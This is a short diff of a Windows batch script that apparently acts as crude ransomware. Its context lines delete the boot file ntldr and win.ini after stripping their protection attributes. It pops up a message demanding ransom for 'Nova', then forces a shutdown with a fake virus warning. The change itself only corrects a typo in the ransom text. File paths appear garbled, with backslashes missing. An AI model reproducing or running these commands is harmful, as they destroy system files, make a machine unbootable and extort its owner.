@@ -13,5 +13,5 @@ del c:ntldr
 attrib -r -s -h c:windowswin.ini
 del c:windowswin.ini
 @echo off
-msg *you are now under Nova's control ,  either worship him by paying  ransom or get yur pc taken over!!!
+msg *you are now under Nova's control ,  either worship him by paying  ransom or get your pc taken over!!!
 shutdown -s -t 7 -c "Critical a virus is taking over c:drive
